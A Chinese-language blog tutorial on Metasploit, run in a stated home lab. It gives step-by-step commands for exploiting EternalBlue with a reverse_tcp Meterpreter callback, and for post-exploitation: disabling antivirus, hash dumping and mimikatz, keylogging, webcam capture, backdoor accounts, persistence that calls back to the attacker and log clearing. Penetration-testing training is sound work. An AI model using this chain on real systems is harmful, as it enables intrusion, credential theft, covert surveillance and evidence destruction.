---
title: MSF使用教程
date: 2024-10-24 21:00:00
tags: ['安全', 'Linux']
---

# Metasploit Framework

- 实验环境
- 简介
- Metasploit 的安装和更新升级
  1. 一键安装MSF
  2. MSF 的更新升级
     1. 非 kali 环境下更新升级 MSF
     2. kali 环境下更新升级 MSF
- 使用方法
  1. 基础使用
  2. `MSF` 中加载自定义的 `exploit 模块`
  3. 漏洞利用 (exploit)
  4. 攻击载荷 (payload)
     4.1 payload 模块路径
     4.2 Metasploit 中的 Payload 模块主要有以下三种类型
  5. Meterpreter
     5.1 Meterpreter 是如何工作的？
     5.2 Meterpreter 的特点
  6. MS17_010 (永恒之蓝)
     6.1 查找漏洞相关模块
     6.2 利用 `Auxiliary 辅助探测模块` 对漏洞进行探测
     6.3 使用 `Exploit 漏洞利用模块` 对漏洞进行利用
     6.4 Payload 攻击载荷模块
  7. 后渗透阶段
     7.1 Post 后渗透模块
     7.2 查看主机是否运行在虚拟机上
     7.3 关闭杀毒软件
     7.4 获取目标主机的详细信息
     7.5 访问文件系统
     7.6 上传 / 下载文件
     7.6.1 下载文件
     7.6.2 上传文件
     7.7 权限提升
     7.8 获取用户密码
     7.9 运行程序
     7.11 屏幕截图
     7.12 创建一个新账号
     7.13 启用远程桌面
     7.14 键盘记录
     7.15 进程迁移
     7.16 禁止目标主机使用键盘鼠标
     7.17 用目标主机摄像头拍照
     7.18 常用扩展库介绍
     7.18.1 load/use 命令
     7.18.2 run 命令
     7.19 生成持续性后门
     7.19.1 启动项启动
     7.19.2 服务启动
     7.20 portfwd 端口转发
     7.21 清除事件日志
  8. 导入并执行 PowerShell 脚本
  9. 加载 stdapi
  10. 升级 Session

---

## 实验环境
> 靶机
> Windows10
> 192.168.100.158

> 攻击机
> Linux Kali
> 192.168.100.132

---

## 简介
Metasploit Framework(MSF) 是一款开源安全漏洞检测工具，附带数千个已知的软件漏洞，并保持持续更新
Metasploit 可以用来信息收集、漏洞探测、漏洞利用等渗透测试的全流程
被安全社区冠以 “可以黑掉整个宇宙” 之名
刚开始的 Metasploit 是采用 Perl 语言编写的，但是再后来的新版中，改成了用 Ruby 语言编写
在 kali 中，自带了 Metasploit 工具
我们接下来以大名鼎鼎的永恒之蓝 MS17_010 漏洞为切入点，讲解 MSF 框架的使用

---

## Metasploit 的安装和更新升级

### 一键安装 MSF

> 在一般的 linux 中，默认是不安装 MSF 的
> 以下是在非 kali 的 Linux 下安装 MSF 框架

所需命令:
~~~bash
#一键安装MSF：
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && chmod 755 msfinstall && ./msfinstall
 
adduser msf                           #添加msf用户
su msf                                #切换到msf用户
cd  /opt/metasploit-framework/bin     #切换到msf所在的目录
./msfconsole                          #以后启动msfconsole，都切换到msf用户下启动，这样会同步数据库。如果使用root用户启动的话，不会同步数据库
 
#也可以将msfconsole加入到执行目录下，这样在任何目录直接msfconsole就可以了
ln -s /opt/metasploit-framework/bin/msfconsole /usr/bin/msfconsole
 
#备注：
#初次运行msf会创建数据库，但是msf默认使用的PostgreSQL数据库不能与root用户关联
#这也这也就是需要新建用户msf来运行metasploit的原因所在
#如果你一不小心手一抖，初次运行是在root用户下
#请使用 msfdb reinit 命令，然后使用非root用户初始化数据库   
 
# 非kali环境下更新升级MSF：
msfupdate							   # MSF后期的升级
# kali环境下更新升级MSF：
apt update 							   # 更新安装包信息；只检查，不更新（已安装的软件包是否有可用的更新，给出汇总报告）
apt upgrade 						   # 更新已安装的软件包，不删除旧包
apt full-upgrade					   # 升级包，删除旧包
~~~

---

### MSF 的更新升级

#### 非 kali 环境下更新升级 MSF
命令：
~~~bash
msfupdate  #MSF后期更新升级
~~~

#### kali 环境下更新升级 MSF
> 由于 kali 中的 Metasploit 渗透测试框架是集成在系统中的
> 不是单独安装，不支持使用 msfupdate 命令更新
> 更新的话需要随系统程序更新

使用 msfupdate 命令会出现下面的情况
~~~bash
┌──(root💀kali)-[~/desktop]
└─# msfupdate
msfupdate is no longer supported when Metasploit is part of the operating
system. Please use 'apt update; apt install metasploit-framework'
~~~

在 kali 中更新 MSF 使用以下命令
~~~bash
apt update 					# 更新安装包信息；只检查，不更新（已安装的软件包是否有可用的更新，给出汇总报告）
apt upgrade 				# 更新已安装的软件包，不删除旧包；
apt full-upgrade			# 升级包，删除旧包
~~~

使用上面命令，是在更新系统程序的同时，把 MSF 更新

---

## 使用方法

### 基础使用
~~~bash
msfconsole										    #进入框架
search  ms17_010                                    # 使用search命令查找相关漏洞
use exploit/windows/smb/ms17_010_eternalblue        # 使用use进入模块
info     										    #使用info查看模块信息
set payload windows/x64/meterpreter/reverse_tcp    	#设置攻击载荷
show options    									#查看模块需要配置的参数
set  RHOST  192.168.100.158    					    #设置参数
exploit / run     								    #攻击
~~~

---

### `MSF` 中加载自定义的 `exploit模块`

[参考CSDN-CVE-2019-0708 远程桌面漏洞复现](https://blog.csdn.net/weixin_45588247/article/details/119488520?spm=1001.2014.3001.5501 "CVE-2019-0708 远程桌面漏洞复现")

---

### 漏洞利用 (exploit)

> 漏洞利用 exploit，也就是我们常说的 exp
> 他就是对漏洞进行攻击的代码

exploit 漏洞利用模块路径 (这里面有针对不同平台的 exploit)：
~~~bash
/usr/share/metasploit-framework/modules/exploits
~~~

---

### 攻击载荷 (payload)

**Payload**
> `Payload` 中包含攻击进入目标主机后需要在远程系统中运行的恶意代码
> 而在 `Metasploit` 中 `Payload` 是一种特殊模块
> 它们能够以漏洞利用模块运行
> 并能够利用目标系统中的安全漏洞实施攻击
> 简而言之，这种漏洞利用模块可以访问目标系统
> 而其中的代码定义了 `Payload` 在目标系统中的行为

**Shellcode**
> `Shellcode` 是 `payload` 中的精髓部分
> 在渗透攻击时作为攻击载荷运行的一组机器指令
> `Shellcode` 通常用汇编语言编写
> 在大多数情况下，目标系统执行了 `shellcode`这一组指令之后
> 才会提供一个命令行 `shell`

#### payload 模块路径
~~~bash
/usr/share/metasploit-framework/modules/payloads
~~~

#### Metasploit 中的 Payload 模块主要有以下三种类型

**Single**：
> 是一种完全独立的 `Payload`，而且使用起来就像运行 `calc.exe` 一样简单
> 例如添加一个系统用户或删除一份文件。由于 `Single Payload` 是完全独立的，因此它们有可能会被类似 `netcat` 这样的非 `metasploit` 处理工具所捕捉到
> 
**Stager**：
> 这种 `Payload 负责建立目标用户与攻击者之间的网络连接`，并下载额外的组件或应用程序
> 一种常见的 `Stager Payload` 就是 `reverse_tcp`，它`可以让目标系统与攻击者建立一条 tcp 连接`，让目标系统主动连接我们的端口 (反向连接)
> 另一种常见的是 `bind_tcp`，它可以`让目标系统开启一个tcp监听器，而攻击者随时可以与目标系统进行通信(正向连接)`
> 
**Stage**：
> 是 `Stager Payload` 下的一种 `Payload组件`
> 这种 Payload 可以提供更加高级的功能，而且没有大小限制

在 Metasploit 中，我们可以通过 Payload 的名称和使用格式来推断它的类型
~~~bash
#Single Payload的格式为：
<target>/ <single>  如：windows/powershell_bind_tcp
#Stager/Stage Payload的格式为：
<target>/ <stage> / <stager>  如：windows/meterpreter/reverse_tcp
~~~

- 当我们在 Metasploit 中执行 show payloads 命令之后，它会给我们显示一个可使用的 Payload 列表

> 在这个列表中，像 `windows/powershell_bind_tcp` 就是一个 `Single Payload`，它不包含 `Stage Payload`
> 而 `windows/meterpreter/reverse_tcp` 则由一个 `Stage Payload (meterpreter)`和 一个 `Stager Payload (reverse_tcp)` 组成

Stager 中几种常见的 payload
~~~bash
windows/meterpreter/bind_tcp       #正向连接
windows/meterpreter/reverse_tcp    #反向连接，常用
windows/meterpreter/reverse_http   #通过监听80端口反向连接
windows/meterpreter/reverse_https  #通过监听443端口反向连接
~~~

- 正向连接使用场景
> 我们的攻击机在内网环境，被攻击机是外网环境，由于被攻击机无法主动连接到我们的主机，所以就必须我们主动连接被攻击机了
> 但是这里经常遇到的问题是，被攻击机上开了防火墙，只允许访问指定的端口，比如被攻击机只对外开放了 80 端口
> 那么，我们就只能设置正向连接 80 端口了，这里很有可能失败，因为 80 端口上的流量太多了

- 反向连接使用场景
> 我们的主机和被攻击机都是在外网或者都是在内网，这样被攻击机就能主动连接到我们的主机了
> 如果是这样的情况，建议使用反向连接
> 因为反向连接的话，即使被攻击机开了防火墙也没事，防火墙只是阻止进入被攻击机的流量，而不会阻止被攻击机主动向外连接的流量

- 反向连接80和443端口使用场景
> 被攻击机能主动连接到我们的主机，还有就是被攻击机的防火墙设置的特别严格
> 就连被攻击机访问外部网络的流量也进行了严格的限制
> 只允许被攻击机的 80 端口或 443 端口与外部通信

---

### Meterpreter
> `Meterpreter` 属于 `stage payload`
> 在 `Metasploit Framework` 中，`Meterpreter` 是一种`后渗透工具`
> 它属于一种在运行过程中可通过网络进行功能扩展的`动态可扩展型 Payload`
> 这种工具是基于 `内存 DLL 注入` 理念实现的
> 它能够通过创建一个`新进程并调用注入的 DLL` 来让`目标系统运行注入的 DLL文件`

#### Meterpreter 是如何工作的？
> 首先目标先要执行初始的溢出漏洞会话连接，可能是 `bind 正向连接`，或者`反弹 reverse 连接`
> 反射连接的时候`加载 dll 链接文件`，同时`后台悄悄处理 dll 文件`
> 其次 `Meterpreter` 核心代码初始化，通过 `socket 套接字`建立一个 `TLS/1.0` 加密隧道并发送 `GET 请求` 给 `Metasploit 服务端`
> `Metasploit 服务端`收到这个 `GET` 请求后就配置相应客户端
> 最后，`Meterpreter` 加载扩展，所有的扩展被加载都通过 `TLS/1.0` 进行数据传输

#### Meterpreter 的特点
- `Meterpreter` 完全驻留在内存，没有写入到磁盘。
- `Meterpreter` 注入的时候不会产生新的进程，并可以很容易的移植到其它正在运行的进程。
- 默认情况下， `Meterpreter` 的通信是加密的，所以很安全。
- 扩展性，许多新的特征模块可以被加载。

我们在设置 `payloads` 时，可以将 `payloads` 设置为：`windows/meterpreter/reverse_tcp`
然后获得了 `meterpreter>` 之后我们就可以干很多事了

---

### MS17_010 (永恒之蓝)

> 我们现在模拟使用 MS17_010 漏洞攻击
> 这个漏洞就是去年危害全球的勒索病毒利用的永恒之蓝漏洞

#### 查找漏洞相关模块

1. 在 kali 命令行里面输入命令 msfconsole，进入 msf 框架中
~~~bash
msfconsole  #输入命令进入msf渗透框架中
~~~

2. 搜索 MS17_010 漏洞
~~~bash
search ms17_010  #利用search命令，搜索漏洞相关利用模块
~~~

#### 利用 `Auxiliary辅助探测模块` 对漏洞进行探测

**Auxiliary辅助探测模块**
> 该模块不会直接在攻击机和靶机之间建立访问，它们只负责执行扫描，嗅探，指纹识别等相关功能以辅助渗透测试

1. 使用 smb_ms17_010 漏洞探测模块对 smb_ms17_010 漏洞进行探测
~~~bash
use auxiliary/scanner/smb/smb_ms17_010
~~~

2. 查看这个模块需要配置的信息
~~~bash
show options  #查看这个模块需要配置的信息
~~~

3. 设置要探测的远程目标
~~~bash
set rhosts 192.168.100.100-192.168.100.190
~~~

4. 对上面设置的 ip 范围内的主机进行攻击
~~~bash
exploit
~~~

#### 使用 `Exploit漏洞利用模块` 对漏洞进行利用

1. 选择漏洞攻击模块，对漏洞进行利用
~~~bash
use exploit/windows/smb/ms17_010_eternalblue
~~~

2. 查看这个漏洞的信息
~~~bash
info
~~~

3. 查看可攻击的系统平台，显示当前攻击模块针对哪些特定操作系统版本、语言版本的系统
~~~bash
show targets  
~~~

#### Payload 攻击载荷模块
> 攻击载荷是我们期望在目标系统在被渗透攻击之后完成的实际攻击功能的代码
> 成功渗透目标后，用于在目标系统上运行任意命令

1. 查看攻击载荷
~~~bash
show  payloads  #该命令可以查看当前漏洞利用模块下可用的所有Payload
~~~

2. 设置攻击载荷
~~~bash
set payload windows/x64/meterpreter/reverse_tcp
~~~

3. 查看模块需要配置的参数
~~~bash
show  options
~~~

4. 设置攻击载荷参数
~~~bash
set RHOST 192.168.100.158   #设置RHOST，也就是要攻击主机的ip
set LHOST 192.168.100.132   #设置LHOST，也就是我们主机的ip，用于接收从目标机弹回来的shell
set lport 6666              #设置lport，也就是我们主机的端口，反弹shell到这个端口；如果我们这里不设置lport的话，默认是4444端口监听；
~~~

5. 进行攻击
~~~bash
exploit
~~~

---

### 后渗透阶段
> 运行了 `exploit` 命令之后
> 我们开启了一个 `reverse TCP` 监听器来监听本地的 `6666` 端口
> 即我(攻击者)的本地主机地址(LHOST)和端口号(LPORT)
> 运行成功之后，我们将会看到命令提示符 `meterpreter >` 出现

Meterpreter 的命令用法:
~~~bash
==========================================
核心命令：
==========================================
命令                           说明
-------                       ------------
?                             帮助菜单
background                    把当前会话挂到后台运行
bg                            background命令的别名
bgkill                        杀死后台meterpreter 脚本
bglist                        列出正在运行的后台脚本
bgrun                         执行一个meterpreter脚本作为后台线程
channel                       显示信息或控制活动频道
close                         关闭一个频道
detach                        分离Meterpreter会话（用于 http/https）
disable_unicode_encoding      禁用 unicode 字符串的编码
enable_unicode_encoding       启用 unicode 字符串的编码
exit                          终止 Meterpreter 会话
get_timeouts                  获取当前会话超时值
guid                          获取会话 GUID
help                          帮助菜单
info                          显示有关 Post 模块的信息
irb                           在当前会话中打开一个交互式 Ruby shell
load                          加载一个或多个 Meterpreter 扩展
machine_id                    获取连接到会话的机器的 MSF ID
migrate                       将服务器迁移到另一个进程
pivot                         管理枢轴侦听器
pry                           在当前会话上打开 Pry 调试器
quit                          终止 Meterpreter 会话
read                          从通道读取数据
resource                      运行存储在文件中的命令
run                           执行一个 Meterpreter 脚本或 Post 模块
secure                       （重新）协商会话上的 TLV 数据包加密
sessions                      快速切换到另一个会话
set_timeouts                  设置当前会话超时值
sleep                         强制 Meterpreter 安静，然后重新建立会话
ssl_verify                    修改 SSL 证书验证设置
transport                     管理运输机制
use                           不推荐使用的load命令别名
uuid                          获取当前会话的 UUID
write                         将数据写入通道

==========================================
Stdapi：文件系统命令
==========================================

命令                           说明
-------                       ------------
cat                           将文件内容读到屏幕上
cd                            切换目录
checksum                      检索文件的校验和
cp                            将源复制到目标
del                           删除指定文件
dir                           列出文件（ls 的别名）
download                      下载文件或目录
edit                          编辑文件
getlwd                        打印本地工作目录
getwd                         打印工作目录
lcd                           更改本地工作目录
lls                           列出本地文件
lpwd                          打印本地工作目录
ls                            列出文件
mkdir                         制作目录
mv                            将源移动到目标
pwd                           打印工作目录
rm                            删除指定文件
rmdir                         删除目录
search                        搜索文件
show_mount                    列出所有挂载点/逻辑驱动器
upload                        上传文件或目录

==========================================
Stdapi：网络命令
==========================================
命令                           说明
-------                       ------------
arp                           显示主机 ARP 缓存
getproxy                      显示当前代理配置
ifconfig                      显示界面
ipconfig                      显示接口
netstat                       显示网络连接
portfwd                       将本地端口转发到远程服务
resolve                       解析目标上的一组主机名
route                         查看和修改路由表

==========================================
Stdapi：系统命令
==========================================
命令                           说明
-------                       ------------
clearev                       清除事件日志
drop_token                    放弃任何活动的模拟令牌。
execute                       执行命令
getenv                        获取一个或多个环境变量值
getpid                        获取当前进程标识符
getprivs                      尝试启用当前进程可用的所有权限
getid                         获取服务器运行的用户的 SID
getuid                        获取服务器运行的用户
kill                          终止进程
localtime                     显示目标系统本地日期和时间
pgrep                         按名称过滤进程
pkill                         按名称终止进程
ps                            列出正在运行的进程
reboot                        重启远程计算机
reg                           修改远程注册表并与之交互
rev2self                      在远程机器上调用 RevertToSelf()
shell                         放入系统命令 shell
shutdown                      关闭远程计算机
steal_token                   尝试从目标进程窃取模拟令牌
suspend                       暂停或恢复进程列表
sysinfo                       获取有关远程系统的信息，例如 OS

==========================================
Stdapi：用户界面命令
==========================================
命令                           说明
-------                       ------------
enumdesktops                  列出所有可访问的桌面和窗口站
getdesktop                    获取当前的meterpreter桌面
idletime                      返回远程用户空闲的秒数
keyboard_send                 发送击键
keyevent                      发送按键事件
keyscan_dump                  转储击键缓冲区
keyscan_start                 开始捕获击键
keyscan_stop                  停止捕获击键
mouse                         发送鼠标事件
screenshare                   实时观看远程用户桌面
screenshot                    抓取交互式桌面的截图
setdesktop                    更改meterpreters当前桌面
uictl                         控制一些用户界面组件

==========================================
Stdapi：网络摄像头命令：
==========================================
命令                           说明
-------                       ------------
record_mic                    从默认麦克风录制音频 X 秒
webcam_chat                   开始视频聊天
webcam_list                   列出网络摄像头
webcam_snap                   从指定的网络摄像头拍摄快照
webcam_stream                 从指定的网络摄像头播放视频流

==========================================
Stdapi：音频输出命令：
==========================================
命令                           说明
-------                       ------------
play                          在目标系统上播放波形音频文件 (.wav)

==========================================
Priv：权限提升命令：
==========================================
命令                           说明
-------                       ------------
getsystem                     尝试将您的权限提升到本地系统的权限。

==========================================
Priv：密码数据库命令：
==========================================
命令                           说明
-------                       ------------
hashdump                      转储 SAM 数据库的内容

==========================================
Priv：Timestomp 命令：
==========================================
命令                           说明
-------                       ------------
timestomp                     操作文件 MACE 属性
~~~

输入 `shell` 即可切换到目标主机的 `windows cmd_shell` 里面
~~~bash
shell         #获取目标主机的cmd_shell权限
chcp 65001    #这里为了避免目标主机cmd_shell字符乱码，设置目标主机命令行的字符编码，65001是UTF-8
~~~

要想从目标主机 `shell` 退出到 `meterpreter` ，只需输入：`exit`

从 `meterpreter` 退出到 `MSF框架`
~~~bash
background   #把我们获得的meterpreter会话挂载到后台运行
~~~

查看前面获得的 meterpreter_shell 会话，最前面的数字是会话的 id
~~~bash
sessions  -l    #查看获得的meterpreter_shell会话列表
~~~

输入 sessions [id 号] 即可进入相应的 meterpreter_shell 中
~~~bash
sessions 1
~~~

输入 `shell` 即可进入 `cmd` 类型的控制
再输入 `powershell` ，即可进入 `powershell` 类型的控制台

~~~bash
sysinfo             									#查看目标主机系统信息
run scraper         									#查看目标主机详细信息
run hashdump        									#导出密码的哈希
load kiwi           									#加载mimikatz
ps                  									#查看目标主机进程信息
pwd                		 								#查看目标当前目录(windows)
getlwd              									#查看目标当前目录(Linux)
search -f *.jsp -d e:\                					#搜索E盘中所有以.jsp为后缀的文件
download  e:\test.txt  /root          					#将目标机的e:\test.txt文件下载到/root目录下
upload    /root/test.txt d:\test      					#将/root/test.txt上传到目标机的 d:\test\ 目录下
getpid             										#查看当前Meterpreter Shell的进程PID
migrate 1384        									#将当前Meterpreter Shell的进程迁移到PID为1384的进程上
idletime           		 								#查看主机运行时间
getuid              									#查看获取的当前权限
getsystem           									#提权,获得的当前用户是administrator才能成功
run  killav        			 							#关闭杀毒软件
screenshot          									#截图
webcam_list         									#查看目标主机的摄像头
webcam_snap         									#拍照
webcam_stream       									#开视频
execute 参数 -f 可执行文件   							    #执行可执行程序
run getgui -u test1 -p Abc123456    					#创建test1用户，密码为Abc123456
run getgui -e                							#开启远程桌面
keyscan_start                							#开启键盘记录功能
keyscan_dump                			 				#显示捕捉到的键盘记录信息
keyscan_stop                 							#停止键盘记录功能
uictl  disable  keyboard     							#禁止目标使用键盘
uictl  enable   keyboard     							#允许目标使用键盘
uictl  disable  mouse        							#禁止目标使用鼠标
uictl  enable   mouse        							#允许目标使用鼠标
load                        							#使用扩展库
run				             							#使用扩展库
 
run exploit/windows/local/persistence lhost=192.168.100.132 lport=8888        #会自动连接192.168.100.132的8888端口，缺点是容易被杀毒软件查杀
portfwd add -l 9999 -r 192.168.100.158 -p 3389     		#将192.168.11.13的3389端口转发到本地的9999端口上，这里的192.168.100.158是获取权限的主机的ip地址
clearev                       #清除日志
~~~

#### Post 后渗透模块
> 该模块主要用于在取得目标主机系统远程控制权后
> 进行一系列的后渗透攻击动作

~~~bash
run post/windows/manage/migrate                			#自动进程迁移
run post/windows/gather/checkvm                			#查看目标主机是否运行在虚拟机上
run post/windows/manage/killav                			#关闭杀毒软件
run post/windows/manage/enable_rdp            			#开启远程桌面服务
run post/windows/manage/autoroute              			#查看路由信息
run post/windows/gather/enum_logged_on_users    		#列举当前登录的用户
run post/windows/gather/enum_applications       		#列举应用程序
run post/windows/gather/credentials/windows_autologin 	#抓取自动登录的用户名和密码
run post/windows/gather/smart_hashdump               	#dump出所有用户的hash
~~~

可输入 `sysinfo` 查看目标主机的信息

#### 查看主机是否运行在虚拟机上
查看主机是否运行在虚拟机上，可以看出主机是在虚拟机环境
~~~bash
run post/windows/gather/checkvm
~~~

#### 关闭杀毒软件
拿到目标主机的 shell 后第一件事就是关闭掉目标主机的杀毒软件
~~~bash
run  killav
~~~

#### 获取目标主机的详细信息
使用命令
~~~bash
run scraper 
~~~
它将目标机器上的常见信息收集起来然后下载保存在本地

#### 访问文件系统
Meterpreter 支持非常多的文件系统命令 (基本跟 Linux 系统命令类似)
~~~bash
pwd     #查看当前目录
cd      #切换目标目录；
cat     #读取文件内容；
rm      #删除文件；
edit    #使用vim编辑文件
ls      #获取当前目录下的文件；
mkdir   #新建目录；
rmdir   #删除目录； 
~~~

#### 上传 / 下载文件

##### 下载文件
~~~bash
download  file #命令可以帮助我们从目标系统中下载文件
~~~

##### 上传文件
~~~bash
upload  file  #命令则能够向目标系统上传文件。
~~~

#### 权限提升
有的时候，你可能会发现自己的 `Meterpreter` 会话受到了用户权限的限制，而这将会严重影响你在目标系统中的活动
比如说，`修改注册表`、`安装后门`或`导出密码`等活动都需要`提升用户权限`
而 `Meterpreter` 给我们提供了一个 `getsystem` 命令
它可以使用多种技术在目标系统中实现提权

~~~bash
getuid
#命令可以获取当前用户的信息，可以看到，当我们使用 getsystem进行提权后，用户身材为  NT AUTHORITY\SYSTEM ，这个也就是Windows的系统权限。
getsystem
#自动提权为系统权限
~~~

#### 获取用户密码
[使用 MSF 抓取用户密码](../b034a3f3/)

#### 运行程序
先查看目标主机安装了哪些应用
~~~bash
run post/windows/gather/enum_applications  #查看目标主机安装了哪些应用
~~~

在 `meterpreter_shell` 命令行执行目标系统中的应用程序
~~~bash
#execute命令用法：
execute [参数] -f 指定的可执行文件

-f：指定可执行文件
-H：创建一个隐藏进程
-a：传递给命令的参数
-i：跟进程进行交互
-m：从内存中执行
-t：使用当前伪造的线程令牌运行进程
-s：在给定会话中执行进程
~~~

#### 屏幕截图
截图目标主机屏幕，图片保存到 `/root/Desktop/` 下
~~~bash
screenshot #截图目标主机屏幕
~~~

#### 创建一个新账号
先查看目标主机有哪些用户
~~~bash
run post/windows/gather/enum_logged_on_users  #查看目标主机有用户
~~~

在目标系统中创建一个新的用户账号的方法一
~~~bash
run getgui -u 用户 -p 密码
-u: 指定用户
-p: 指定密码
~~~

> 这个命令会创建用户
> 并把他添加到 `Administrators` 组中
> 这样该用户就拥有远程桌面的权限了

在目标系统中创建一个新的用户账号的方法二
~~~bash
enable_rdp脚本:
run post/windows/manage/enable_rdp USERNAME=test2 PASSWORD=Abc123456  #添加用户
run post/windows/manage/enable_rdp                                    #开启远程桌面
run post/windows/manage/enable_rdp FORWARD=true LPORT=6662            #将3389端口转发到6662
~~~

#### 启用远程桌面
当我们新添加的用户已经拥有远程桌面之后
我们就可以使用这个账号凭证来开启远程桌面会话了

首先，我们需要确保目标 Windows 设备开启了远程桌面功能（需要开启多个服务）
我们输入
~~~bash
run post/windows/manage/enable_rdp
~~~
命令可以开启远程桌面

在开启远程桌面会话之前
我们还需要使用 `idletime` 命令检查远程用户的空闲时长
~~~bash
idletime #检查远程用户的空闲时长
~~~

开启远程桌面
~~~bash
run post/windows/manage/enable_rdp
~~~

#### 键盘记录
Meterpreter 还可以在目标设备上实现键盘记录功能
键盘记录主要涉及以下三种命令
~~~bash
keyscan_start  #开启键盘记录功能，开关键盘记录功能后目标输入的内容我们就通过keyscan_dump命令在Meterpreter里面进行查看；
keyscan_dump   #显示捕捉到的键盘记录信息
keyscan_stop   #停止键盘记录功能
~~~
> 在使用键盘记录功能时
> 通常需要跟目标进程进行绑定
> 然后获取该进程下的键盘记录

#### 进程迁移
Meterpreter 既可以单独运行
也可以与其他进程进行绑定
因此，我们可以让 `Meterpreter` 与类似 `explorer.exe` 这样的进程进行绑定
并以此来实现持久化

在下面的例子中
我们会将 `Meterpreter` 跟 `winlogon.exe` 绑定
并在登录进程中捕获键盘记录，以获得用户的密码

首先，我们需要使用 `ps` 命令查看目标设备中运行的进程
~~~bash
ps
~~~

使用 `getpid` 查看我们当前的进程 id
~~~bash
getpid
~~~

使用 `migrate + 目标进程ID` 命令来绑定目标进程 id
通过进程迁移后
当前的 `Meterpreter` 的 `pid` 已经和 `winlogon.exe` 一样了
~~~bash
migrate 123
~~~
这里绑定目标 `pid` 的时候，经常会断了 `shell`
进程迁移后会自动关闭原来 `Meterpreter` 进程
没有关闭可使用 `kill pid` 命令关闭进程。

或者使用自动迁移进程
~~~bash
run post/windows/manage/migrate
~~~
系统会自动寻找合适的进程然后迁移

#### 禁止目标主机使用键盘鼠标
~~~bash
uictl  disable(enable) keyboard  #禁止(允许)目标使用键盘
uictl  disable(enable) mouse     #禁止(允许)目标使用鼠标
~~~

#### 用目标主机摄像头拍照
~~~bash
webcam_list    #获取目标系统的摄像头列表
webcam_snap    #从指定的摄像头，拍摄照片
webcam_stream  #从指定的摄像头，开启视频
~~~

#### 常用扩展库介绍
> `Meterpreter` 中不仅有基本命令还有很多扩展库
> 下面就介绍一下常用的扩展库的查看方法

##### load/use 命令
~~~bash
load/use     #加载模块
load -l      #列出所有可用的扩展
load -help   #帮助；说明
~~~

命令 `load -l` 会列出所有可用的扩展

输入 `load` 后 `双击Tab键` 也可以列出可用扩展

##### run 命令
~~~bash
run   #执行一个已有的模块
~~~
`run+双击Tab键` 会列出所有的已有的脚本；
常用的有 `autoroute` , `hashdump` , `arp_scanner` , `multi_meter_inject` 等

#### 生成持续性后门
> 因为 `Meterpreter` 是基于 `内存DLL` 建立的连接
> 所以，只要目标主机关机，我们的连接就会断
> 总不可能我们每次想连接的时候，每次都去攻击
> 然后再利用 `Meterpreter` 建立连接
> 所以，我们得在目标主机系统内留下一个`持续性的后门`
> 只要目标主机`开机`了，我们就可以连接到该主机

建立持续性后门有两种方法
- 通过启动项启动 `persistence`
- 通过服务启动 `metsvc`

##### 启动项启动
先使用 `Msfvenonm` 生成一个后门木马
然后放到 `windows的启动目录` 中
> C:\Users\$username$\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
这样这个后门每次开机就都能启动了
然后我们只要相连就监听相应的端口就行了

##### 服务启动
~~~bash
run exploit/windows/local/persistence lhost=192.168.100.132 lport=8888 #自动连接192.168.100.158的8888端口，缺点是容易被杀毒软件查杀
~~~
然后它就在目标机新建了这个文件
C:\Windows\TEMP\****.vbs 
并把该服务加入了注册表中
只要开机就会启动

#### PortFwd 端口转发
`portfwd` 是 `Meterpreter` 提供的一种基本的`端口转发`
`porfwd` 可以 `反弹单个端口` 到 `本地`, 并且 `监听`
使用方法如下
~~~bash
portfwd add -l 9999 -r 192.168.100.158 -p 3389   
#将192.168.100.158的3389端口转发到本地的9999端口上，这里的192.168.100.158是获取权限的主机的ip地址
-l:   #本地监听的端口，用于接收目标主机的端口反弹
-p:   #目标服务器的端口；
add:  #添加一个连接
~~~
然后我们只要访问`本地`的 `3389` 端口就可以连接到`目标主机`的 `3389 `端口了
~~~bash
rdesktop 127.0.0.1:9999
~~~

如果不想继续连接的话
可以删除当前建立的连接
执行以下命令
~~~bash
portfwd delet -l 9999 -r 192.168.100.158 -p 3389   
delet   #删除一个连接
~~~


#### 清除事件日志
完成攻击操作之后
千万别忘了 "打扫战场"
我们的所有操作都会被记录在目标系统的日志文件之中
因此我们需要在完成攻击之后使用以下命令来清除事件日志
~~~bash
clearev  #清除事件日志
~~~

### 导入并执行 PowerShell 脚本
如果 `powershell` 脚本是用于域内信息收集的
则获取到的权限用户需要是域用户
~~~bash
load powershell                           			#加载powershell功能
powershell_import /root/PowerView.ps1      			#导入powershell脚本，提前将该powershell脚本放到指定目录
powershell_execute Get-NetDomain           			#执行该脚本下的功能模块Get-domain，该模块用于获取域信息，一个脚本下通常有多个功能模块;获取当前用户所在域的名称;
powershell_execute Invoke-UserHunter      			#该功能模块用于定位域管理员登录的主机;
powershell_execute Get-NetForest           			#该模块用于定位域信息
powershell_execute Invoke-EnumerateLocalAdmin 	    #枚举域中所有计算机上本地管理员组的成员
~~~

### 加载 stdapi
有时候虽然我们获取到了 `Meterpreter`
但是执行一些命令会显示没有该命令
这时我们可以执行 `load stdapi` 来加载
这样我们就可以执行命令了

### 升级 Session
有时候，当我们收到的不是 `Meterpreter` 类型的 `session` 的话
可能不好操作，我们可以执行命令 `sessions -u id` 来升级 `session`
执行该命令，默认调用的是 `post/multi/manage/shell_to_meterpreter` 模块

